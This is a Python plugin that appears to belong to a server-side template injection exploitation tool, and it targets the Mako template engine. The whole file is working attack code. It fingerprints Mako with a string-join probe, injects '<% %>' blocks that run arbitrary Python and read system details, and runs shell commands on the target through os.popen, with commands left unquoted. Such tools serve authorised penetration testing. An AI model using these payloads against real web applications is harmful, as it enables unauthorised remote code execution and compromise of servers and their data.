from core.check import Check
from utils.loggers import log
from utils import rand
import string

class Mako(Check):

    render_tag = '${%(payload)s}'
    header_tag = '${%(header)s}'
    trailer_tag = '${%(trailer)s}'
    contexts = [
        { 'level': 1, 'prefix': '}', 'suffix' : '${' },
    ]

    def detect_engine(self):

        randA = rand.randstr_n(2)
        randB = rand.randstr_n(2)

        payload = '${"%s".join("%s")}' % (randA, randB)
        expected = randA.join(randB)

        if expected == self.inject(payload):
            self.set('language', 'python')
            self.set('engine', 'mako')
            self.set('eval', 'python')

    def detect_eval(self):

        payload = """<% import sys, os; x=os.name; y=sys.platform; %>${x}-${y}"""
        self.set('eval', 'python')
        self.set('os', self.inject(payload))

    def evaluate(self, code):
        return self.inject('<%% %s %%>' % (code))

    def detect_exec(self):

        expected_rand = str(rand.randint_n(2))

        if expected_rand == self.execute('echo %s' % expected_rand):
            self.set('exec', True)

    def execute(self, command):

        # TODO: quote command
        return self.inject("""<%% import os; x=os.popen('%s').read() %%>${x}""" % (command))
